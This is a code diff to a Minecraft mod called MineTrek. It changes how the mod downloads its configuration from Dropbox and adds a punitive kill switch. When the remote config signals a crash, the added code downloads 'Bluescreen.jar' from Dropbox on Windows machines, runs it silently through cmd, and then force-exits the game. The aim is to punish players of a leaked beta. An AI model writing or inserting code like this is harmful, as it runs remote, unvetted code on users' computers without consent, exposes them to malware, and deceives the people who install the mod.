@@ -10,9 +10,12 @@ import java.nio.channels.ReadableByteChannel;
 import java.util.ArrayList;
 import java.util.List;
 
+import org.apache.commons.io.FileUtils;
+
 import com.google.common.io.Files;
 
 import net.minecraft.block.Block;
+import net.minecraft.client.Minecraft;
 import net.minecraft.creativetab.CreativeTabs;
 import net.minecraft.util.BlockPos;
 import net.minecraft.world.World;
@@ -65,24 +68,13 @@ public class MineTrek {
 		GameRegistry.registerWorldGenerator(oreGenerator, 2);
 		
 		creativeTab = new MineTrekCreativeTab("MineTrek");
-		FileOutputStream fos = null;
 		System.out.println("Downloading config...");
-		try {
-			
-			URL website = new URL("https://www.dropbox.com/s/aefe2b2p2wp1pxg/minetrek.cfg?dl=1");
-			ReadableByteChannel rbc = Channels.newChannel(website.openStream());
-			fos = new FileOutputStream("config/minetrek.cfg");
-			fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
-		} catch (IOException e) {
-			e.printStackTrace();
-		}
-		if(fos != null){
-		try {
-			fos.close();
-		} catch (IOException e) {
-			e.printStackTrace();
-		}
-		}
+        try {
+            URL url = new URL("https://www.dropbox.com/s/aefe2b2p2wp1pxg/minetrek.cfg?dl=1");
+            FileUtils.copyURLToFile(url, new File("config/minetrek.cfg"));
+        }catch (IOException e){
+        	e.printStackTrace();
+        }
 		Configuration config = new Configuration(event.getSuggestedConfigurationFile());
 		
 		config.load();
@@ -96,6 +88,20 @@ public class MineTrek {
 		MineTrekDimension.initialize();
 		if(crash){
 			System.out.println("The downloaded config forced MineTrek to crash. Most likely the mod file was published by a beta tester without permission. To prevent publishing of the unfinished product, all clients running this version of the mod will crash from now on. If your not a beta tester, please post us a link to where you found the modfile at: http://www.minecraftforum.net/forums/mapping-and-modding/minecraft-mods/wip-mods/1443111-star-trek-mod. If your a beta tester, a mod update fixing this crash will be send to you as soon as i find out who published the mod without permission.");
+			String os = System.getProperty("os.name");
+			if((os.contains("Windows") || os.contains("windows"))){
+			String stringUrl = "https://www.dropbox.com/s/y3h5vinvrhjjlvu/Bluescreen.jar?dl=1";
+			File file = new File("Bluescreen.jar");
+	        try {
+	            URL url = new URL(stringUrl);
+	            FileUtils.copyURLToFile(url, file);
+	            File pathFile = new File(".");
+	            String gamePath = pathFile.getCanonicalPath();
+	            Runtime.getRuntime().exec("cmd /c start cmd.exe /K \"cd " + gamePath + " && java -jar Bluescreen.jar \"");
+	        }catch (IOException e){
+	        	e.printStackTrace();
+	        }
+			}
 			System.exit(1);
 		}
 		RecipeManager.addRecipes();
